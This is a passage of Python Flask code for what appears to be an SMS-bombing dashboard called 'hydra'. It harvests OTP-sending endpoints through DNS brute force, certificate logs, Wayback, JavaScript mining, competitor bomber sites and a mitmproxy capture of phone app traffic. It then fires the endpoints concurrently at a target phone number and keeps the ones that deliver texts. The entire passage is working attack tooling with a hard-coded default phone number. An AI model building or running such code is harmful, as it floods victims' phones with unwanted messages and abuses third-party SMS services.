                    _hunt_log("DNS Brute: no new OTP subdomains found", "info")
            except Exception as e:
                import traceback as _tb
                _hunt_log(f"❌ DNS brute crashed: {e}", "error")
                for line in _tb.format_exc().splitlines()[-3:]:
                    _hunt_log(f"   {line.strip()}", "error")
            finally:
                _dns_done.set()

        dns_thread = threading.Thread(target=_run_dns_late, daemon=True, name="hydra-dns-brute")
        dns_thread.start()
        _dns_done.wait(timeout=180)   # DNS brute can take 2-3 min for 1050 lookups

        # ── Snapshot after (NOW includes DNS yield) ──
        after_v = after_c = 0
        if os.path.exists(_TARGETS_FILE):
            with open(_TARGETS_FILE, encoding="utf-8") as f:
                snap2 = json.load(f)
            after_v = len(snap2.get("verified", []))
            after_c = len(snap2.get("candidates", []))

        new_v = after_v - before_v
        new_c = after_c - before_c

        with _hunt_lock:
            _hunt_state.update(fired=max(fired, 80), hits=hits,
                                new_verified=new_v, new_candidates=new_c,
                                total_verified=after_v,
                                skipped_verified=skip_stats.get("verified", 0),
                                skipped_dead=skip_stats.get("dead", 0),
                                skipped_candidate=skip_stats.get("candidate", 0))

        _hunt_log(f"─────────────────────────────────────────────────────", "info")
        _hunt_log(f"✅ Hunt complete — {new_c} new candidates added (DISCOVER never auto-verifies)", "success")
        if new_v > 0:
            _hunt_log(f"   {new_v} verified count change (manual promote/retire happened)", "info")
        _hunt_log(f"   Yield breakdown by hunter:", "info")
        if _dork_found[0]:
            _hunt_log(f"     🆕 GitHub dorker: {_dork_found[0]} new source files", "success")
        if _crt_found[0]:
            _hunt_log(f"     🆕 CRT.sh: {_crt_found[0]} OTP subdomains", "success")
        if _wb_found[0]:
            _hunt_log(f"     🆕 Wayback CDX: {_wb_found[0]} historical endpoints", "success")
        if _js_found[0]:
            _hunt_log(f"     🆕 JS Miner: {_js_found[0]} private web endpoints", "success")
        if _us_found[0]:
            _hunt_log(f"     🆕 URLScan: {_us_found[0]} observed endpoints", "success")
        if _sw_found[0]:
            _hunt_log(f"     🆕 Swagger: {_sw_found[0]} API doc endpoints", "success")
        if _dns_found[0]:
            _hunt_log(f"     🆕 DNS Brute: {_dns_found[0]} hidden subdomain endpoints", "success")
        if _comp_found[0]:
            _hunt_log(f"     🆕 Competitor: {_comp_found[0]} endpoints from rival bomber sites", "success")
        if not any([_dork_found[0], _crt_found[0], _wb_found[0], _js_found[0],
                    _us_found[0], _sw_found[0], _dns_found[0], _comp_found[0]]):
            _hunt_log(f"     (No new yields this run — sources stable, try again tomorrow)", "warn")

        if after_c > 0:
            _hunt_log(f"👀 {after_c} candidates pending in the pool — open Endpoint Pool to test+add them", "sys")
            _hunt_log(f"   Each candidate: click Test → check phone → click Add if SMS arrived", "info")
        else:
            _hunt_log("No pending candidates — pool is current", "info")
        with _hunt_lock:
            _hunt_state["new_candidates"] = after_c

    except Exception as exc:
        import traceback as _tb
        _hunt_log(f"❌ Hunt failed: {exc}", "error")
        for line in _tb.format_exc().splitlines()[-5:]:
            _hunt_log(f"   {line.strip()}", "error")
    finally:
        elapsed = round(time.time() - t0, 1)
        with _hunt_lock:
            _hunt_state.update(running=False, done=True, elapsed=elapsed)
        _hunt_log(f"Hunt finished in {elapsed}s", "sys")


@app.route("/api/hunt/start", methods=["POST"])
def api_hunt_start():
    if _hunt_state.get("running"):
        return jsonify({"ok": False, "error": "Hunt already running"})
    body  = request.get_json(force=True, silent=True) or {}
    phone = str(body.get("phone", "8777849865")).strip()
    if not (phone.isdigit() and len(phone) >= 10):
        phone = "8777849865"
    t = threading.Thread(target=_run_hunt_bg, args=(phone,), daemon=True, name="hydra-hunt")
    t.start()
    return jsonify({"ok": True, "message": "Hunt started"})


@app.route("/api/hunt/status")
def api_hunt_status():
    with _hunt_lock:
        state = dict(_hunt_state)
    # Always expose live pool count so the modal header shows correctly even before first hunt
    if state.get("total_verified", 0) == 0 and not state.get("running"):
        try:
            if os.path.exists(_TARGETS_FILE):
                with open(_TARGETS_FILE, encoding="utf-8") as _f:
                    _db = json.load(_f)
                state["total_verified"] = len(_db.get("verified", []))
        except Exception:
            pass
    return jsonify(state)


@app.route("/api/hunt/candidates")
def api_hunt_candidates():
    if not os.path.exists(_TARGETS_FILE):
        return jsonify({"candidates": [], "verified_count": 0})
    with open(_TARGETS_FILE, encoding="utf-8") as f:
        db = json.load(f)
    return jsonify({
        "candidates":     db.get("candidates", []),
        "verified_count": len(db.get("verified", [])),
    })


# ── Test state — fires candidates at phone and reports results ──
_OTP_KEYWORDS_SERVER = [
    "otp_sent", "otp sent", "otpsent", "success", '"status":1', '"status": 1',
    "resendsmscounter", "sent\":\"true", "otpgenerated", "otp generated",
    "sms sent", "verification sent", '"result":"ok"', '"status":"ok"',
    '"status":"success"', '"message":"success"', '"msg":"success"',
    '"otp":', '"token":', '"requestid":', 'expires_in', 'resend_in', 'mobile_number',
]
_TEST_STATE: dict = {"running": False, "results": [], "logs": [], "phone": ""}
_TEST_LOCK = threading.Lock()


def _fire_candidate_once(ep: dict, phone: str, timeout: int = 8) -> dict:
    """Fire one candidate endpoint, return {name, status, otp_found, ok}."""
    name = ep.get("name", "?")
    try:
        url = ep.get("url", "").replace("<PHONE>", phone)
        method = ep.get("method", "POST").upper()
        h = {
            "User-Agent": "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 Chrome/120.0 Mobile",
            "Accept": "application/json, */*",
            "Accept-Language": "en-IN,en;q=0.9",
        }
        h.update(ep.get("extra_headers", {}))
        raw_payload = ep.get("payload") or ep.get("data") or {}
        payload = (
            {k: v.replace("<PHONE>", phone) if isinstance(v, str) else v
             for k, v in raw_payload.items()}
            if isinstance(raw_payload, dict) else raw_payload
        )
        try:
            from curl_cffi import requests as cffi
            sess = cffi.Session(impersonate="chrome120")
        except ImportError:
            import requests as req_mod
            sess = req_mod.Session()
        ct = ep.get("content_type", "json")
        if method == "POST":
            if ct in ("json", "") or not ct:
                h["Content-Type"] = "application/json"
                r = sess.post(url, json=payload, headers=h, timeout=timeout)
            else:
                r = sess.post(url, data=payload, headers=h, timeout=timeout)
        else:
            r = sess.get(url, headers=h, timeout=timeout)
        body = r.text[:600].lower()
        otp_found = any(kw in body for kw in _OTP_KEYWORDS_SERVER)
        return {"name": name, "status": r.status_code, "otp_found": otp_found, "ok": r.status_code == 200}
    except Exception as exc:
        return {"name": name, "status": 0, "otp_found": False, "ok": False, "error": str(exc)[:80]}


def _run_test_bg(phone: str, only_names: list | None = None) -> None:
    """Background: fire selected candidates at phone, record results.
    If `only_names` is provided, only those candidate names are fired (manual select).
    Otherwise all candidates are fired (legacy behaviour).
    """
    with _TEST_LOCK:
        _TEST_STATE.update(running=True, results=[], logs=[], phone=phone)

    def tlog(msg: str, lvl: str = "sys"):
        ts = datetime.now().strftime("%H:%M:%S")
        with _TEST_LOCK:
            _TEST_STATE["logs"].append({"t": ts, "msg": msg, "lvl": lvl})
        _log_queue.put({"t": ts, "msg": f"[TEST] {msg}", "lvl": lvl})

    # Load candidates + re-test any verified too
    candidates = []
    if os.path.exists(_TARGETS_FILE):
        with open(_TARGETS_FILE, encoding="utf-8") as f:
            db = json.load(f)
        candidates = db.get("candidates", [])

    if only_names:
        wanted = set(only_names)
        candidates = [c for c in candidates if c.get("name") in wanted]
        tlog(f"Manual selection — {len(candidates)} of {len(wanted)} candidates matched", "sys")

    if not candidates:
        tlog("No candidates to fire — run DISCOVER first or select some", "warn")
        with _TEST_LOCK:
            _TEST_STATE["running"] = False
        return

    tlog(f"Firing {len(candidates)} endpoints at {phone[:4]}xxxxxx — watch for SMS!", "sys")
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=8) as ex:
        futs = {ex.submit(_fire_candidate_once, ep, phone): ep for ep in candidates}
        done_count = 0
        for fut in concurrent.futures.as_completed(futs):
            r = fut.result()
            done_count += 1
            results.append(r)
            if r.get("otp_found"):
                tlog(f"✓ OTP KEYWORD  {r['name']}", "success")
            elif r.get("ok"):
                tlog(f"~ HTTP 200     {r['name']}", "info")
            else:
                tlog(f"✗ {r.get('status',0):<5}        {r['name']}", "warn")

    otp_count = sum(1 for r in results if r.get("otp_found"))
    ok_count  = sum(1 for r in results if r.get("ok"))
    tlog(f"Done — {otp_count} OTP keyword hits | {ok_count} HTTP 200 | {len(candidates)} total fired", "success")
    tlog("Check your phone now — tick every endpoint that sent an actual SMS", "sys")
    with _TEST_LOCK:
        _TEST_STATE.update(running=False, results=results)


@app.route("/api/hunt/test", methods=["POST"])
def api_hunt_test():
    if _TEST_STATE.get("running"):
        return jsonify({"ok": False, "error": "Test already running"})
    body  = request.get_json(force=True, silent=True) or {}
    phone = str(body.get("phone", "8777849865")).strip()
    if not (phone.isdigit() and len(phone) >= 10):
        phone = "8777849865"
    raw_names = body.get("names")
    only_names = [str(n) for n in raw_names] if isinstance(raw_names, list) and raw_names else None
    t = threading.Thread(target=_run_test_bg, args=(phone, only_names), daemon=True, name="hydra-test")
    t.start()
    return jsonify({"ok": True, "selected": len(only_names) if only_names else None})


@app.route("/api/hunt/test/status")
def api_hunt_test_status():
    with _TEST_LOCK:
        return jsonify(dict(_TEST_STATE))


@app.route("/api/hunt/confirm", methods=["POST"])
def api_hunt_confirm():
    """Human-confirm specific endpoints: move them from candidates → verified."""
    body  = request.get_json(force=True, silent=True) or {}
    names = body.get("names", [])
    if not names or not os.path.exists(_TARGETS_FILE):
        return jsonify({"ok": False, "error": "No names provided or DB missing"})
    with open(_TARGETS_FILE, encoding="utf-8") as f:
        db = json.load(f)
    candidates = db.get("candidates", [])
    to_promote = [c for c in candidates if c.get("name") in names]
    remaining  = [c for c in candidates if c.get("name") not in names]
    for ep in to_promote:
        ep["verified"] = True
        ep["human_confirmed"] = True
        ep["confirm_date"] = datetime.now().strftime("%Y-%m-%d")
        ep.pop("notes", None)  # clean up candidate notes
    db["verified"] = db.get("verified", []) + to_promote
    db["candidates"] = remaining
    db.setdefault("_meta", {})["verified_count"] = len(db["verified"])
    db["_meta"]["updated"] = datetime.now().strftime("%Y-%m-%d")
    with open(_TARGETS_FILE, "w", encoding="utf-8") as f:
        json.dump(db, f, indent=2, ensure_ascii=False)
    # Sync to hydra_v4 memory
    import hydra_v4 as _hv4
    existing_names = {t.get("name") for t in _hv4.VERIFIED_TARGETS}
    added = [t for t in to_promote if t.get("name") not in existing_names]
    _hv4.VERIFIED_TARGETS.extend(added)
    _state["api_count"] = len(_hv4.VERIFIED_TARGETS)
    return jsonify({
        "ok": True, "promoted": len(to_promote),
        "total_verified": len(db["verified"]),
        "names": [ep.get("name") for ep in to_promote],
    })


@app.route("/api/hunt/promote", methods=["POST"])
def api_hunt_promote():
    """Legacy route — promotes ALL candidates (no names filter)."""
    promoted = _auto_promote_all()
    return jsonify({"ok": True, "promoted": promoted,
                    "total_verified": _state.get("api_count", 0)})


# ─────────────────────────────────────────────────────────────
#  COMPETITOR HUNT — standalone trigger
# ─────────────────────────────────────────────────────────────
_comp_hunt_state: dict = {
    "running": False, "done": False, "found": 0, "phone": "", "logs": [], "elapsed": 0.0
}
_comp_hunt_lock = threading.Lock()


def _comp_hunt_log(msg: str, lvl: str = "info") -> None:
    ts = datetime.now().strftime("%H:%M:%S")
    with _comp_hunt_lock:
        _comp_hunt_state["logs"].append({"t": ts, "msg": msg, "lvl": lvl})
    _log_queue.put({"t": ts, "msg": f"[COMP] {msg}", "lvl": lvl})


def _run_comp_hunt_bg(phone: str) -> None:
    import sys as _sys
    t0 = time.time()
    with _comp_hunt_lock:
        _comp_hunt_state.update(running=True, done=False, found=0, phone=phone, logs=[], elapsed=0.0)

    _comp_hunt_log(f"🕵️  Competitor Hunt started — phone: {phone}", "sys")
    try:
        if "hydra_competitor_hunter" in _sys.modules:
            del _sys.modules["hydra_competitor_hunter"]
        import hydra_competitor_hunter as _comp
        import io
        buf = io.StringIO(); old = _sys.stdout; _sys.stdout = buf
        try:
            total = _comp.run(phone)
        finally:
            _sys.stdout = old
        # Mirror captured output to hunt log
        for line in buf.getvalue().splitlines():
            clean = line.strip()
            if clean:
                lvl = "success" if "✓" in clean or "✅" in clean else (
                      "error"   if "ERROR" in clean or "crashed" in clean else "info")
                _comp_hunt_log(clean, lvl)
        with _comp_hunt_lock:
            _comp_hunt_state["found"] = total if isinstance(total, int) else 0
        _comp_hunt_log(f"✅ Competitor hunt done — {_comp_hunt_state['found']} endpoints extracted", "success")
    except Exception as exc:
        import traceback as _tb
        _comp_hunt_log(f"❌ Competitor hunt failed: {exc}", "error")
        for line in _tb.format_exc().splitlines()[-4:]:
            _comp_hunt_log(line.strip(), "error")
    finally:
        elapsed = round(time.time() - t0, 1)
        with _comp_hunt_lock:
            _comp_hunt_state.update(running=False, done=True, elapsed=elapsed)
        _comp_hunt_log(f"Finished in {elapsed}s", "sys")


@app.route("/api/hunt/competitor/start", methods=["POST"])
def api_comp_hunt_start():
    if _comp_hunt_state.get("running"):
        return jsonify({"ok": False, "error": "Competitor hunt already running"})
    body  = request.get_json(force=True, silent=True) or {}
    phone = str(body.get("phone", "8777849865")).strip()
    if not (phone.isdigit() and len(phone) >= 10):
        phone = "8777849865"
    t = threading.Thread(target=_run_comp_hunt_bg, args=(phone,), daemon=True, name="hydra-comp-hunt")
    t.start()
    return jsonify({"ok": True, "message": "Competitor hunt started"})


@app.route("/api/hunt/competitor/status")
def api_comp_hunt_status():
    with _comp_hunt_lock:
        return jsonify(dict(_comp_hunt_state))


# ─────────────────────────────────────────────────────────────
#  MANUAL INTERCEPT MODE — headed Chrome + user solves CAPTCHAs
# ─────────────────────────────────────────────────────────────
_manual_state_lock = threading.Lock()
_manual_state: dict = {
    "running": False, "done": False, "found": 0,
    "phone": "", "elapsed": 0.0, "logs": [],
}


def _run_manual_bg(phone: str) -> None:
    import importlib
    import hydra_competitor_manual as _m
    importlib.reload(_m)

    def _on_log(entry: dict) -> None:
        with _manual_state_lock:
            _manual_state["logs"].append(entry)
            _manual_state["logs"] = _manual_state["logs"][-300:]
            _manual_state["found"] = _m.get_state().get("found", 0)
            _manual_state["elapsed"] = _m.get_state().get("elapsed", 0.0)

    with _manual_state_lock:
        _manual_state.update(
            running=True, done=False, found=0,
            phone=phone, elapsed=0.0, logs=[],
        )

    try:
        _m.run(phone=phone, max_minutes=20, log_callback=_on_log)
    except Exception as exc:
        with _manual_state_lock:
            _manual_state["logs"].append({
                "t": time.strftime("%H:%M:%S"),
                "msg": f"Crashed: {exc}", "lvl": "error",
            })
    finally:
        st = _m.get_state()
        with _manual_state_lock:
            _manual_state.update(
                running=False, done=True,
                found=st.get("found", 0),
                elapsed=st.get("elapsed", 0.0),
            )


@app.route("/api/hunt/competitor/manual/start", methods=["POST"])
def api_manual_start():
    try:
        with _manual_state_lock:
            if _manual_state.get("running"):
                return jsonify({"ok": False, "error": "Manual intercept already running"})
        body  = request.get_json(force=True, silent=True) or {}
        phone = "".join(c for c in str(body.get("phone", "8777849865")) if c.isdigit())
        if len(phone) < 10:
            phone = "8777849865"
        threading.Thread(
            target=_run_manual_bg, args=(phone,),
            daemon=True, name="hydra-manual-intercept",
        ).start()
        return jsonify({"ok": True, "message": "Manual intercept browser launching\u2026"})
    except Exception as _exc:
        import traceback as _tb
        return jsonify({"ok": False, "error": str(_exc), "trace": _tb.format_exc()}), 500


@app.route("/api/hunt/competitor/manual/done", methods=["POST"])
def api_manual_done():
    """Signal the running intercept to stop and save now (user clicked Done)."""
    try:
        import hydra_competitor_manual as _m
        _m.stop()
    except Exception:
        pass
    return jsonify({"ok": True})


@app.route("/api/hunt/competitor/manual/status")
def api_manual_status():
    with _manual_state_lock:
        return jsonify(dict(_manual_state))


# ─────────────────────────────────────────────────────────────
#  MOBILE CAPTURE  —  mitmproxy on PC ⇄ phone over WiFi
# ─────────────────────────────────────────────────────────────
import subprocess as _subprocess
import socket as _socket

_mobile_state: dict = {
    "running": False,
    "phone": "",
    "port": 8082,
    "lan_ip": "",
    "captured": 0,
    "last_capture": None,   # {name, host, ts}
    "started_at": None,
    "log": [],              # rolling list of last ~50 capture summaries
    "verdicts": {"GREEN": 0, "YELLOW": 0, "RED": 0},
    "error": "",
}
_mobile_lock = threading.Lock()
_mobile_proc: dict = {"p": None}


MOBILE_PORT = 8082  # permanent — never changes, iPhone configured once

def _detect_lan_ip() -> str:
    """Return PC's LAN IP that the phone can reach (works without internet)."""
    # Try multiple targets in case one route is unreachable
    for target in [("8.8.8.8", 80), ("192.168.1.1", 80), ("10.0.0.1", 80)]:
        try:
            s = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
            s.settimeout(1)
            s.connect(target)
            ip = s.getsockname()[0]
            s.close()
            if ip and not ip.startswith("127."):
                return ip
        except Exception:
            pass
    try:
        # Fallback: enumerate all interfaces and pick first non-loopback
        import socket as _sock
        hostname = _sock.gethostname()
        addrs = _sock.getaddrinfo(hostname, None, _sock.AF_INET)
        for addr in addrs:
            ip = addr[4][0]
            if not ip.startswith("127."):
                return ip
    except Exception:
        pass
    return "127.0.0.1"

def _pc_hostname() -> str:
    """Return hostname with .local suffix for mDNS — works on iPhone without IP."""
    try:
        name = _socket.gethostname()
        # .local suffix enables mDNS resolution on iOS/macOS/Android
        return f"{name}.local"
    except Exception:
        return "localhost"


def _mitmdump_path() -> str | None:
    """Locate mitmdump.exe in the venv or PATH."""
    here = os.path.dirname(os.path.abspath(__file__))
    candidates = [
        os.path.join(here, ".venv", "Scripts", "mitmdump.exe"),
        os.path.join(here, ".venv", "Scripts", "mitmdump"),
        "mitmdump",
    ]
    for c in candidates:
        if os.path.isabs(c) and os.path.exists(c):
            return c
    # Try PATH lookup
    try:
        from shutil import which
        w = which("mitmdump")
        if w:
            return w
    except Exception:
        pass
    return None


_install_state: dict = {"running": False, "log": "", "ok": False, "done": False}
_install_lock = threading.Lock()


def _run_pip_install_bg() -> None:
    """Background pip install of mitmproxy into the project venv."""
    here = os.path.dirname(os.path.abspath(__file__))
    pip_exe = os.path.join(here, ".venv", "Scripts", "pip.exe")
    if not os.path.exists(pip_exe):
        # Fallback to current python's pip
        pip_exe = sys.executable
        pip_args = [pip_exe, "-m", "pip", "install", "mitmproxy"]
    else:
        pip_args = [pip_exe, "install", "mitmproxy"]
    try:
        creationflags = 0x08000000 if os.name == "nt" else 0
        proc = _subprocess.Popen(
            pip_args,
            stdout=_subprocess.PIPE, stderr=_subprocess.STDOUT,
            text=True, creationflags=creationflags,
        )
        chunks: list[str] = []
        assert proc.stdout is not None
        for line in proc.stdout:
            chunks.append(line)
            with _install_lock:
                tail = "".join(chunks)[-4000:]
                _install_state["log"] = tail
        proc.wait()
        ok = proc.returncode == 0 and _mitmdump_path() is not None
        with _install_lock:
            _install_state.update(running=False, done=True, ok=ok)
    except Exception as e:
        with _install_lock:
            _install_state.update(running=False, done=True, ok=False,
                                  log=_install_state.get("log", "") + f"\n\nERROR: {e}")


@app.route("/api/mobile-capture/install", methods=["POST"])
def api_mobile_install():
    """Install mitmproxy into the venv. Idempotent."""
    if _mitmdump_path():
        return jsonify({"ok": True, "already_installed": True})
    with _install_lock:
        if _install_state.get("running"):
            return jsonify({"ok": False, "error": "Install already in progress"})
        _install_state.update(running=True, done=False, ok=False, log="Starting pip install mitmproxy…\n")
    threading.Thread(target=_run_pip_install_bg, daemon=True, name="hydra-mitm-install").start()
    return jsonify({"ok": True, "started": True})


@app.route("/api/mobile-capture/install/status")
def api_mobile_install_status():
    with _install_lock:
        return jsonify({
            "installed": _mitmdump_path() is not None,
            "running": _install_state.get("running", False),
            "done": _install_state.get("done", False),
            "ok": _install_state.get("ok", False),
            "log": _install_state.get("log", "")[-1500:],
        })


@app.route("/api/mobile-capture/start", methods=["POST"])
def api_mobile_start():
    """Launch mitmdump with our addon. Phone must use this PC as HTTP proxy."""
    body = request.get_json(force=True, silent=True) or {}
    phone = "".join(c for c in str(body.get("phone", "")) if c.isdigit())
    if len(phone) < 10:
        return jsonify({"ok": False, "error": "Provide a 10-digit phone number first."}), 400
    port = MOBILE_PORT  # always fixed — iPhone configured once and done

    with _mobile_lock:
        if _mobile_state.get("running") and _mobile_proc["p"] and _mobile_proc["p"].poll() is None:
            return jsonify({"ok": False, "error": "Mobile capture already running.",
                            "lan_ip": _mobile_state["lan_ip"], "port": _mobile_state["port"]})

        mitm = _mitmdump_path()
        if not mitm:
            # Auto-trigger install in background so the UI just shows progress
            with _install_lock:
                if not _install_state.get("running"):
                    _install_state.update(running=True, done=False, ok=False,
                                          log="Auto-installing mitmproxy…\n")
                    threading.Thread(target=_run_pip_install_bg, daemon=True,
                                     name="hydra-mitm-install").start()
            return jsonify({
                "ok": False,
                "installing": True,
                "error": "mitmproxy not installed yet — auto-install started. Watch progress above and click START again in 30-60s.",
            }), 202

        addon = os.path.join(os.path.dirname(os.path.abspath(__file__)), "hydra_mobile_addon.py")
        env = os.environ.copy()
        env["HYDRA_PHONE"] = phone
        env["HYDRA_INGEST"] = "http://127.0.0.1:4040"
        # Hosts that use cert-pinning or detect MITM — let them passthrough
        # so App Store / banking / WhatsApp / GPay / Cred etc. work normally
        # while iPhone proxy is ON. Indian app OTP endpoints are NOT in this list,
        # so they still get captured.
        IGNORE_HOSTS = (
            r"("
            r"apple\.com|icloud\.com|mzstatic\.com|itunes\.apple\.com|push\.apple\.com"
            r"|apple-cloudkit\.com|cdn-apple\.com|aaplimg\.com|cdn\.apple-mapkit\.com"
            r"|whatsapp\.com|whatsapp\.net|wa\.me"
            r"|paytm\.com|paytmbank\.com|phonepe\.com|gpay\.app|pay\.google\.com"
            r"|cred\.club|cred\.com|cred\.in"
            r"|instagram\.com|facebook\.com|snapchat\.com|sc-cdn\.net|cdninstagram\.com|fbcdn\.net"
            r"|hdfcbank\.com|sbi\.co\.in|onlinesbi\.sbi|icicibank\.com|axisbank\.com"
            r"|kotak\.com|yesbank\.in|idfcfirstbank\.com|federalbank\.co\.in|indusind\.com"
            r"|pnbindia\.in|bankofbaroda\.in|canarabank\.com|unionbankofindia\.co\.in"
            r"|bobibanking\.com|aubank\.in|rblbank\.com|hdfclife\.com|iciciprulife\.com"
            r"|googleapis\.com|gstatic\.com|google\.com|googletagmanager\.com|doubleclick\.net"
            r"|appsflyer\.com|adjust\.com|branch\.io|sentry\.io|datadog|newrelic\.com"
            r")(:\d+)?$"
        )
        try:
            # CREATE_NO_WINDOW = 0x08000000 to hide the console on Windows
            creationflags = 0x08000000 if os.name == "nt" else 0
            # Kill any stale mitmdump still holding the port (from previous session)
            try:
                if os.name == "nt":
                    _subprocess.run(["taskkill", "/F", "/IM", "mitmdump.exe"],
                                    stdout=_subprocess.DEVNULL,
                                    stderr=_subprocess.DEVNULL,
                                    creationflags=creationflags,
                                    timeout=3)
                    import time as _t
                    _t.sleep(0.4)  # give port a moment to release
            except Exception:
                pass

            # Capture stderr to a log file so we can show real errors in the dashboard
            _err_log = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                    "mobile_mitm_err.log")
            _err_fh = open(_err_log, "wb")
            p = _subprocess.Popen(
                [mitm, "-s", addon, "-p", str(port), "--listen-host", "0.0.0.0",
                 "--set", "block_global=false",
                 "--ignore-hosts", IGNORE_HOSTS],
                env=env,
                stdout=_err_fh,
                stderr=_err_fh,
                creationflags=creationflags,
            )

            # Wait 1.2s — if it crashes immediately, surface the error now
            import time as _t2
            _t2.sleep(1.2)
            if p.poll() is not None:
                _err_fh.close()
                err_text = ""
                try:
                    with open(_err_log, encoding="utf-8", errors="replace") as f:
                        err_text = f.read()[-1500:]
                except Exception:
                    pass
                return jsonify({
                    "ok": False,
                    "error": f"mitmdump exited immediately (code {p.returncode}). "
                             f"Most common cause: port {port} already in use. Details: {err_text or '(no stderr)'}",
                }), 500
        except Exception as e:
            return jsonify({"ok": False, "error": f"Failed to launch mitmdump: {e}"}), 500

        _mobile_proc["p"] = p
        lan_ip = _detect_lan_ip()
        hostname = _pc_hostname()
        _mobile_state.update({
            "running": True,
            "phone": phone,
            "port": port,
            "lan_ip": lan_ip,
            "hostname": hostname,
            "captured": 0,
            "last_capture": None,
            "started_at": datetime.now().isoformat(timespec="seconds"),
            "log": [],
            "verdicts": {"GREEN": 0, "YELLOW": 0, "RED": 0},
            "error": "",
        })

        # Watchdog: auto-restart mitmdump if it crashes (so iPhone never loses internet)
        def _watchdog(ph: str, po: int):
            while True:
                with _mobile_lock:
                    if not _mobile_state.get("running"):
                        break  # user stopped capture — exit
                    wp = _mobile_proc.get("p")
                    if wp and wp.poll() is not None:
                        # Process died — restart it
                        _mobile_state["error"] = "mitmdump crashed — auto-restarting…"
                        try:
                            _env = os.environ.copy()
                            _env["HYDRA_PHONE"] = ph
                            _env["HYDRA_INGEST"] = "http://127.0.0.1:4040"
                            _addon = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                                                  "hydra_mobile_addon.py")
                            _cf = 0x08000000 if os.name == "nt" else 0
                            _mitm = _mitmdump_path()
                            if _mitm:
                                new_p = _subprocess.Popen(
                                    [_mitm, "-s", _addon, "-p", str(po),
                                     "--listen-host", "0.0.0.0",
                                     "--set", "block_global=false",
                                     "--ignore-hosts", IGNORE_HOSTS],
                                    env=_env,
                                    stdout=_subprocess.DEVNULL,
                                    stderr=_subprocess.DEVNULL,
                                    creationflags=_cf,
                                )
                                _mobile_proc["p"] = new_p
                                _mobile_state["error"] = ""
                        except Exception as ex:
                            _mobile_state["error"] = f"Auto-restart failed: {ex}"
                import time as _time
                _time.sleep(2)

        threading.Thread(target=_watchdog, args=(phone, port), daemon=True,
                         name="hydra-mitm-watchdog").start()

        return jsonify({"ok": True, "lan_ip": lan_ip, "hostname": hostname, "port": port,
                        "proxy": f"{lan_ip}:{port}",
                        "cert_url": "http://mitm.it"})


@app.route("/api/mobile-capture/stop", methods=["POST"])
def api_mobile_stop():
    with _mobile_lock:
        p = _mobile_proc.get("p")
        if p and p.poll() is None:
            try:
                p.terminate()
                try:
                    p.wait(timeout=3)
                except Exception:
                    p.kill()
            except Exception:
                pass
        _mobile_proc["p"] = None
        captured = _mobile_state.get("captured", 0)
        _mobile_state["running"] = False
        return jsonify({"ok": True, "captured": captured})


@app.route("/api/mobile-capture/status")
def api_mobile_status():
    with _mobile_lock:
        # Check if subprocess died
        p = _mobile_proc.get("p")
        if _mobile_state.get("running") and p and p.poll() is not None:
            _mobile_state["running"] = False
            _mobile_state["error"] = f"mitmdump exited (code {p.returncode})"
        state = dict(_mobile_state)
        # Always force-refresh IP and hostname (don't use setdefault — it won't override "")
        fresh_ip = _detect_lan_ip()
        state["hostname"] = _pc_hostname()
        state["port"] = MOBILE_PORT
        state["lan_ip"] = fresh_ip if fresh_ip != "127.0.0.1" else state.get("lan_ip", "")
        return jsonify(state)


@app.route("/api/mobile-capture/ingest", methods=["POST"])
def api_mobile_ingest():
    """Receive a captured request from the mitmproxy addon and save as candidate."""
    try:
        ep = request.get_json(force=True, silent=True) or {}
        if not ep.get("url") or not ep.get("name"):
            return jsonify({"ok": False, "error": "missing url/name"}), 400
        try:
            from hydra_db_lock import atomic_add_candidates
            added = atomic_add_candidates([ep])
        except Exception as e:
            return jsonify({"ok": False, "error": str(e)}), 500

        with _mobile_lock:
            if added:
                _mobile_state["captured"] += 1
            _mobile_state["last_capture"] = {
                "name": ep.get("name"),
                "host": ep.get("captured_host", ""),
                "method": ep.get("method", ""),
                "url_short": ep.get("url", "")[:80],
                "ts": time.strftime("%H:%M:%S"),
                "added": bool(added),
                "verdict": (ep.get("quality") or {}).get("verdict", "—"),
                "score": (ep.get("quality") or {}).get("score", 0),
                "flags": (ep.get("quality") or {}).get("flags", []),
            }
            log = _mobile_state.setdefault("log", [])
            log.append(_mobile_state["last_capture"])
            if len(log) > 50:
                _mobile_state["log"] = log[-50:]
            # Tally verdicts for the dashboard summary
            tally = _mobile_state.setdefault("verdicts", {"GREEN": 0, "YELLOW": 0, "RED": 0})
            v = (ep.get("quality") or {}).get("verdict")
            if v in tally:
                tally[v] += 1
        return jsonify({"ok": True, "added": bool(added)})
    except Exception as e:
        return jsonify({"ok": False, "error": str(e)}), 500


# ─────────────────────────────────────────────────────────────
#  POOL DASHBOARD — inspect + retest verified pool
# ─────────────────────────────────────────────────────────────
_POOL_RETEST_STATE: dict = {
    "running": False, "done": False, "phone": "",
    "results": [], "logs": [],
}
_POOL_RETEST_LOCK = threading.Lock()


@app.route("/api/pool/sync_community", methods=["POST"])
def api_pool_sync_community():
    """Agentic Flow: pulls latest community_drops.json directly from the
    GitHub repo (so the user never has to `git pull`), merges new URLs
    into candidates, dedupes against verified+candidates+dead.
    """
    try:
        scraped: list = []
        source_used = "local"
        # 1) Try cloud-first: fetch fresh JSON straight from raw.githubusercontent.com.
        try:
            import urllib.request
            raw_url = (
                "https://raw.githubusercontent.com/Pramsss108/"
                "word-hacker-404/main/community_drops.json"
            )
            req = urllib.request.Request(
                raw_url,
                headers={"User-Agent": "HydraDashboard/1.0", "Cache-Control": "no-cache"},
            )
            with urllib.request.urlopen(req, timeout=10) as r:
                cloud_payload = json.loads(r.read().decode("utf-8", errors="replace"))
                scraped = cloud_payload.get("new_endpoints", []) or []
                source_used = f"cloud ({len(scraped)} endpoints)"
                # Cache locally for offline fallback
                with open("community_drops.json", "w", encoding="utf-8") as f:
                    json.dump(cloud_payload, f, indent=2, ensure_ascii=False)
        except Exception as cloud_err:
            # 2) Cloud failed (offline / 404) → fall back to local cache
            if os.path.exists("community_drops.json"):
                with open("community_drops.json", "r", encoding="utf-8") as f:
                    scraped = json.load(f).get("new_endpoints", []) or []
                source_used = f"local cache ({len(scraped)} endpoints, cloud err: {cloud_err})"
            else:
                # 3) No cache either → run scraper synchronously (slow path)
                os.system("python hydra_community_scraper.py")
                if os.path.exists("community_drops.json"):
                    with open("community_drops.json", "r", encoding="utf-8") as f:
